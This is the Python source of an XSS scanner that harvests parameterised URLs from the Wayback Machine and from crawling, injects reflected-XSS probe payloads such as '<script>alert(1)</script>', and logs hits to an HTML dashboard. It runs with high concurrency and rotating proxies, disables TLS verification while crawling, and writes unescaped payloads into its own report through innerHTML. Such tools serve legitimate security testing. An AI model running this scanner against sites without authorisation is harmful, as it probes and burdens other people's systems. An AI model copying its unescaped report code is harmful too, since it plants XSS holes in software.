#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
xrayxss — XSS-focused scanner inspired by xray (chaitin/xray)
Usage examples:
  python xrayxss.py webscan --basic-crawler http://example.com --html-output vuln.html
  python xrayxss.py webscan --basic-crawler example.com --workers 150 --proxies proxies.txt --playwright
Only use on targets you are authorized to test.
"""

import argparse
import asyncio
import json
import os
import re
import time
import urllib.parse
from itertools import cycle
from typing import List, Optional, Tuple, Dict, Set

# Networking / HTTP
import httpx
import requests
from bs4 import BeautifulSoup

# File I/O async
import aiofiles

# Optional: Playwright verification (render + execute JS)
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except Exception:
    PLAYWRIGHT_AVAILABLE = False

# Terminal colors
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except Exception:
    class _C:
        def __getattr__(self, k): return ""
    Fore = Style = _C()

# -------------------------
# Defaults / configuration
# -------------------------
SMOKE_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'';!--\"<XSS>=&{}"
]
# If user has large payload file, point XSS_PAYLOAD_FILE to it
XSS_PAYLOAD_FILE = "xss.txt"
SMOKE_COUNT = 30
OUTDIR_DEFAULT = "output_xrayxss"
CONCURRENCY_DEFAULT = 150
RATE_LIMIT_PER_HOST = 0.02
GLOBAL_RPS = 400
REQUEST_TIMEOUT = 8.0
SAVE_EVIDENCE = True
BATCH_EVIDENCE_FLUSH = 20

# HTML dashboard template (your template inserted here, trimmed a bit)
# We'll use the user's template exactly as previously provided but insert a receiveReport function.
# For brevity in this code block we generate a minimal wrapper that loads a template file if present.
DEFAULT_TEMPLATE = "dashboard_template.html"  # if exists, we'll use; otherwise generate a simple one

# -------------------------
# Utilities
# -------------------------
def ensure_dir(path: str):
    os.makedirs(path, exist_ok=True)
    return path

def safe_name_for_file(s: str) -> str:
    return re.sub(r'[^0-9A-Za-z\-_\.]', '_', s)[:200]

def load_payloads(path: str) -> List[str]:
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f if l.strip()]
        return lines
    return []

def inject_payload(url: str, payload: str) -> str:
    """Place payload into every parameter value of query string."""
    if "?" not in url:
        return url
    base, qs = url.split("?", 1)
    parts = []
    for p in qs.split("&"):
        if "=" in p:
            k, v = p.split("=", 1)
            parts.append(f"{k}={urllib.parse.quote(payload)}")
        else:
            parts.append(f"{p}={urllib.parse.quote(payload)}")
    return f"{base}?{'&'.join(parts)}"

def extract_param_urls_from_html(text: str, base_url: str) -> List[str]:
    """Find links / forms with query parameters in page HTML."""
    out = []
    try:
        soup = BeautifulSoup(text, "html.parser")
        # anchors
        for a in soup.find_all("a", href=True):
            href = a['href']
            full = urllib.parse.urljoin(base_url, href)
            if "?" in full or "=" in full:
                out.append(full)
        # forms (action with inputs)
        for f in soup.find_all("form", action=True):
            act = urllib.parse.urljoin(base_url, f['action'])
            # if action contains query params, add; else if inputs exist, add a dummy param
            if "?" in act or "=" in act:
                out.append(act)
            else:
                # attempt to build parameterized URL from input names (quick heuristic)
                inputs = [inp.get("name") for inp in f.find_all("input", attrs={"name": True})]
                if inputs:
                    qs = "&".join(f"{name}=1" for name in inputs)
                    out.append(act + ("?" + qs if "?" not in act else "&" + qs))
    except Exception:
        pass
    return out

# -------------------------
# Wayback + crawling
# -------------------------
def load_wayback(domain: str, limit: int = 500) -> List[str]:
    """Fetch list of archived URLs from Wayback Machine (best-effort)."""
    out = []
    try:
        q = urllib.parse.quote(f"*.{domain}/*")
        url = f"http://web.archive.org/cdx/search/cdx?url={q}&output=json&fl=original&collapse=urlkey&limit={limit}"
        headers = {"User-Agent": "xrayxss/1.0"}
        resp = requests.get(url, timeout=12, headers=headers)
        resp.raise_for_status()
        data = resp.json()
        for item in data[1:]:
            # item might be list or string
            if isinstance(item, list):
                candidate = item[0]
            else:
                candidate = item
            if candidate and candidate not in out:
                out.append(candidate)
            if len(out) >= limit:
                break
    except Exception:
        # fallback to text mode
        try:
            url2 = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=text&fl=original&collapse=urlkey&limit={limit}"
            r2 = requests.get(url2, timeout=12, headers={"User-Agent":"xrayxss/1.0"})
            r2.raise_for_status()
            for line in r2.text.splitlines():
                line=line.strip()
                if line and line not in out:
                    out.append(line)
                    if len(out) >= limit:
                        break
        except Exception:
            print(Fore.YELLOW + f"[!] Wayback fetch failed for {domain}" + Style.RESET_ALL)
    return out

def crawl_site(start_url: str, max_depth: int = 1, max_pages: int = 200) -> List[str]:
    from urllib.parse import urljoin
    domain = urllib.parse.urlparse(start_url).netloc
    visited, q, found = set(), [(start_url, 0)], []
    while q and len(visited) < max_pages:
        url, depth = q.pop(0)
        if url in visited or depth > max_depth:
            continue
        visited.add(url)
        try:
            r = requests.get(url, timeout=6, verify=False, headers={"User-Agent":"xrayxss-crawler/1.0"})
            for u in extract_param_urls_from_html(r.text or "", url):
                if domain in urllib.parse.urlparse(u).netloc and u not in visited:
                    found.append(u)
            # enqueue links
            soup = BeautifulSoup(r.text or "", "html.parser")
            for link in soup.find_all("a", href=True):
                full = urljoin(url, link['href'])
                if domain in urllib.parse.urlparse(full).netloc and full not in visited:
                    q.append((full, depth+1))
        except Exception:
            continue
    return sorted(set(found))

# -------------------------
# Async scanning primitives
# -------------------------
class HostRateLimiter:
    def __init__(self, min_delay: float):
        self.min_delay = min_delay
        self._last: Dict[str, float] = {}
        self._lock = asyncio.Lock()
    async def wait(self, host: str):
        async with self._lock:
            now = time.monotonic()
            last = self._last.get(host, 0.0)
            wait_for = self.min_delay - (now - last)
            if wait_for > 0:
                await asyncio.sleep(wait_for)
            self._last[host] = time.monotonic()

class GlobalRateLimiter:
    def __init__(self, rps: int):
        self._interval = 1.0 / max(1, rps)
        self._lock = asyncio.Lock()
        self._last = 0.0
    async def wait(self):
        async with self._lock:
            now = time.monotonic()
            elapsed = now - self._last
            if elapsed < self._interval:
                await asyncio.sleep(self._interval - elapsed)
            self._last = time.monotonic()

async def fetch_text(client: httpx.AsyncClient, url: str, timeout: float) -> Optional[str]:
    try:
        r = await client.get(url, timeout=timeout)
        return r.text or ""
    except Exception:
        return None

async def test_payloads_on_url(client: httpx.AsyncClient, url: str, payloads: List[str], timeout: float) -> Optional[Tuple[str,str,str]]:
    for p in payloads:
        test = inject_payload(url, p)
        text = await fetch_text(client, test, timeout)
        if text is None:
            continue
        dec = urllib.parse.unquote_plus(p)
        if p in text or dec in text:
            return (test, p, text)
    return None

def make_session_factory(proxies_cycle: Optional[cycle], verify_tls: bool, limits: Optional[httpx.Limits]=None, http2: bool=True):
    def factory():
        proxy = None
        if proxies_cycle:
            proxy = next(proxies_cycle)
        client = httpx.AsyncClient(http2=http2, verify=verify_tls, timeout=REQUEST_TIMEOUT, limits=limits)
        if proxy:
            client._proxies = {"all://": proxy}
        return client
    return factory

# -------------------------
# Playwright verification (optional)
# -------------------------
async def playwright_verify(url: str, payload: str, timeout=12.0) -> bool:
    if not PLAYWRIGHT_AVAILABLE:
        return False
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            await page.goto(url, timeout=timeout*1000)
            # wait a short while to allow JS to run
            await asyncio.sleep(1.0)
            # check for alert presence? Playwright cannot capture native alerts easily without handlers;
            # instead, we check if payload string appears in page content / innerHTML
            content = await page.content()
            await browser.close()
            return payload in content
    except Exception:
        return False

# -------------------------
# Live dashboard (append <script>call to template)
# -------------------------
async def write_dashboard_initial(outdir: str, html_filename: str, use_template_path: Optional[str]=None):
    ensure_dir(outdir)
    path = os.path.join(outdir, html_filename)
    if use_template_path and os.path.exists(use_template_path):
        # read user-supplied template and inject receiveReport function if not present
        with open(use_template_path, "r", encoding="utf-8", errors="ignore") as f:
            tpl = f.read()
        if "function receiveReport" not in tpl:
            # append a small receiveReport if not present
            insert = """
<script>
function receiveReport(obj){
  try{
    // attempt to reuse existing 'sample' & render functions if present
    if(typeof receiveReportFallback === 'function'){ receiveReportFallback(obj); return; }
    // fallback: append a row to reports table (minimal)
    const t = document.getElementById('reports');
    if(t){
      const tr = document.createElement('tr');
      tr.innerHTML = `<td>-</td><td title="${obj.url}">${obj.url}</td><td><code>${(obj.payload||'')}</code></td><td><span class='tag vuln'>${obj.status||'vulnerable'}</span></td><td>${obj.ts||''}</td><td><button class='btn ghost' onclick='alert(\\\"Open evidence manually\\\")'>Open</button></td>`;
      t.prepend(tr);
    }
  }catch(e){console.error('receiveReport error',e)}
}
</script>
</body>"""
            # try to insert before closing body
            tpl = tpl.replace("</body>", insert)
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            await f.write(tpl)
    else:
        # write a minimal report HTML if no template available
        simple = f"""<!doctype html><html><head><meta charset=\"utf-8\"><title>xrayxss report</title></head><body><h1>xrayxss live report</h1><table><thead><tr><th>#</th><th>URL</th><th>Payload</th><th>Status</th><th>Timestamp</th></tr></thead><tbody id='reports'></tbody></table><script>function receiveReport(o){{const t=document.getElementById('reports');const tr=document.createElement('tr');tr.innerHTML=`<td>-</td><td>${{o.url}}</td><td><code>${{o.payload}}</code></td><td>${{o.status}}</td><td>${{o.ts}}</td>`;t.prepend(tr);}}</script></body></html>"""
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            await f.write(simple)
    return path

async def append_to_dashboard(outdir: str, html_filename: str, url: str, payload: str, status: str='vulnerable'):
    path = os.path.join(outdir, html_filename)
    ts = time.strftime('%Y-%m-%d %H:%M:%S')
    obj = {'url': url, 'payload': payload, 'status': status, 'ts': ts}
    js = f"<script>try{{ if(typeof receiveReport==='function') receiveReport({json.dumps(obj)}); else console.warn('no receiveReport'); }}catch(e){{console.error(e)}}</script>\n"
    async with aiofiles.open(path, "a", encoding="utf-8") as f:
        await f.write(js)

# -------------------------
# Orchestration: two-stage scan with live reporting
# -------------------------
async def worker_job(url: str, smoke_payloads: List[str], full_payloads: Optional[List[str]], session_factory, host_rl: HostRateLimiter, global_rl: GlobalRateLimiter, found_q: asyncio.Queue, timeout: float):
    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc
    await host_rl.wait(host)
    await global_rl.wait()
    client: httpx.AsyncClient = session_factory()
    try:
        # smoke phase
        res = await test_payloads_on_url(client, url, smoke_payloads, timeout)
        if res:
            test_url, p, text = res
            await found_q.put((test_url, p, text, url))
            # if full payloads provided: fuzz only this url
            if full_payloads:
                # small sleep to avoid immediate bursts
                await asyncio.sleep(0.01)
                full_res = await test_payloads_on_url(client, url, full_payloads, timeout)
                if full_res:
                    await found_q.put((full_res[0], full_res[1], full_res[2], url))
    finally:
        await client.aclose()

async def run_scan(urls: List[str], smoke_payloads: List[str], full_payloads: Optional[List[str]], concurrency: int, proxies: List[str], outdir: str, html_filename: str, verify_with_playwright: bool):
    ensure_dir(outdir)
    path_report = await write_dashboard_initial(outdir, html_filename, use_template_path=DEFAULT_TEMPLATE if os.path.exists(DEFAULT_TEMPLATE) else None)
    limits = httpx.Limits(max_keepalive_connections=max(10, concurrency//2), max_connections=max(50, concurrency*2))
    proxies_cycle = cycle(proxies) if proxies else None
    session_factory = make_session_factory(proxies_cycle, verify_tls=True, limits=limits, http2=True)

    host_rl = HostRateLimiter(RATE_LIMIT_PER_HOST)
    global_rl = GlobalRateLimiter(GLOBAL_RPS)

    sem = asyncio.Semaphore(concurrency)
    found_q: asyncio.Queue = asyncio.Queue()
    tasks = []

    async def sem_job(u):
        async with sem:
            await worker_job(u, smoke_payloads, full_payloads, session_factory, host_rl, global_rl, found_q, REQUEST_TIMEOUT)

    for u in urls:
        tasks.append(asyncio.create_task(sem_job(u)))

    hits_set: Set[str] = set()
    evidence_batch = []

    async def consumer():
        nonlocal evidence_batch
        while True:
            try:
                item = await asyncio.wait_for(found_q.get(), timeout=1.0)
            except asyncio.TimeoutError:
                if all(t.done() for t in tasks) and found_q.empty():
                    break
                else:
                    continue
            if not item:
                continue
            test_url, payload, text, original = item
            if test_url not in hits_set:
                hits_set.add(test_url)
                # save evidence
                relpath = None
                if SAVE_EVIDENCE:
                    ev_dir = ensure_dir(os.path.join(outdir, "evidence"))
                    safe = safe_name_for_file(test_url)
                    fn = os.path.join(ev_dir, f"{safe}__resp.html")
                    try:
                        async with aiofiles.open(fn, "w", encoding="utf-8") as f:
                            await f.write(f"<!-- payload: {payload} -->\n")
                            await f.write(text or "")
                        relpath = os.path.relpath(fn, outdir)
                    except Exception:
                        relpath = None
                # optional Playwright verification
                verified = False
                if verify_with_playwright:
                    # use test_url (payload already injected) to verify
                    verified = await playwright_verify(test_url, payload, timeout=12.0)
                # append live report immediately
                await append_to_dashboard(outdir, html_filename, test_url if verified or not verify_with_playwright else original, payload, 'vulnerable' if verified or not verify_with_playwright else 'suspect')
                # terminal notify
                print(Fore.MAGENTA + Style.BRIGHT + f"[>>> FOUND] {test_url} payload={payload} verified={verified}" + Style.RESET_ALL)
            # batching (not used heavily here)
            if len(evidence_batch) >= BATCH_EVIDENCE_FLUSH:
                # flush if you implement batch writes (optional)
                evidence_batch = []
    consumer_task = asyncio.create_task(consumer())
    await asyncio.gather(*tasks)
    await consumer_task

    # save hits list
    hits_file = os.path.join(outdir, "xss_found_urls.txt")
    async with aiofiles.open(hits_file, "w", encoding="utf-8") as f:
        for h in sorted(hits_set):
            await f.write(h + "\n")

    print(Fore.GREEN + f"[✓] Scan finished. {len(hits_set)} hits. Report: {path_report} and {hits_file}" + Style.RESET_ALL)

# -------------------------
# CLI and flow
# -------------------------
def parse_xray_style_args(argv: List[str]):
    # support: xray webscan --basic-crawler <target> --html-output <file>
    # argv is sys.argv[1:]
    if len(argv) >= 2 and argv[0] == "webscan":
        p = argparse.ArgumentParser(prog="xray webscan")
        p.add_argument("--basic-crawler", required=True)
        p.add_argument("--html-output", default="vuln.html")
        p.add_argument("--workers", type=int, default=CONCURRENCY_DEFAULT)
        p.add_argument("--proxies")
        p.add_argument("--limit-urls", type=int, default=0)
        p.add_argument("--playwright", action="store_true", help="Verify using Playwright (slow)")
        return p.parse_args(argv[1:])
    return None

def parse_args():
    import sys
    # check if invoked like: xray webscan ...
    if len(sys.argv) > 1 and sys.argv[1] == "webscan":
        # emulate xray subcommand
        args = parse_xray_style_args(sys.argv[1:])
        if args:
            return {
                "targets": args.basic_crawler,
                "workers": args.workers,
                "proxies": args.proxies,
                "limit_urls": args.limit_urls,
                "html_output": args.html_output,
                "playwright": args.playwright
            }
    p = argparse.ArgumentParser(prog="xrayxss")
    p.add_argument("--targets", "-t", required=True, help="domain or file with URLs")
    p.add_argument("--workers", type=int, default=CONCURRENCY_DEFAULT)
    p.add_argument("--proxies", help="path to proxies.txt (one per line)")
    p.add_argument("--outdir", default=OUTDIR_DEFAULT)
    p.add_argument("--html-output", default="vuln.html")
    p.add_argument("--limit-urls", type=int, default=0)
    p.add_argument("--playwright", action="store_true", help="Verify hits using Playwright (slower)")
    ns = p.parse_args()
    return {
        "targets": ns.targets,
        "workers": ns.workers,
        "proxies": ns.proxies,
        "limit_urls": ns.limit_urls,
        "html_output": ns.html_output,
        "playwright": ns.playwright
    }

def gather_target_urls(arg_target: str, limit: int=0) -> List[str]:
    # if file: read urls; if domain: use wayback + crawl
    if os.path.exists(arg_target):
        with open(arg_target, "r", encoding="utf-8") as f:
            urls = [l.strip() for l in f if l.strip()]
        return [u for u in urls if ("?" in u or "=" in u)]
    domain = arg_target.strip()
    print(Fore.CYAN + f"[~] Gathering URLs for {domain} (wayback + crawl) ..." + Style.RESET_ALL)
    wayback = load_wayback(domain, limit=limit if limit>0 else 500)
    crawled = crawl_site(f"http://{domain}", max_depth=1, max_pages=200)
    combined = list(dict.fromkeys(wayback + crawled))
    return [u for u in combined if ("?" in u or "=" in u)][:limit if limit>0 else None] if limit>0 else [u for u in combined if ("?" in u or "=" in u)]

async def main():
    opts = parse_args()
    targets_arg = opts["targets"]
    workers = opts["workers"]
    proxies_path = opts["proxies"]
    outdir = opts.get("outdir", OUTDIR_DEFAULT)
    html_output = opts.get("html_output", "vuln.html")
    limit_urls = opts.get("limit_urls", 0)
    verify_play = opts.get("playwright", False)

    proxies = []
    if proxies_path and os.path.exists(proxies_path):
        with open(proxies_path, "r", encoding="utf-8") as f:
            proxies = [l.strip() for l in f if l.strip()]

    urls = gather_target_urls(targets_arg, limit=limit_urls)
    if not urls:
        print(Fore.YELLOW + "[!] No parameterized URLs found, exiting." + Style.RESET_ALL)
        return

    # payloads: smoke then full (if user provides xss.txt)
    full_payloads = load_payloads(XSS_PAYLOAD_FILE)
    smoke = SMOKE_PAYLOADS.copy()
    if full_payloads:
        # take top N as smoke if many
        smoke = full_payloads[:SMOKE_COUNT] if len(full_payloads) >= SMOKE_COUNT else full_payloads

    print(Fore.GREEN + f"[i] Targets to scan: {len(urls)} URLs | Workers: {workers} | Proxies: {len(proxies)} | HTML: {html_output}" + Style.RESET_ALL)

    await run_scan(urls, smoke, full_payloads, workers, proxies, outdir, html_output, verify_play)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Aborted by user." + Style.RESET_ALL)
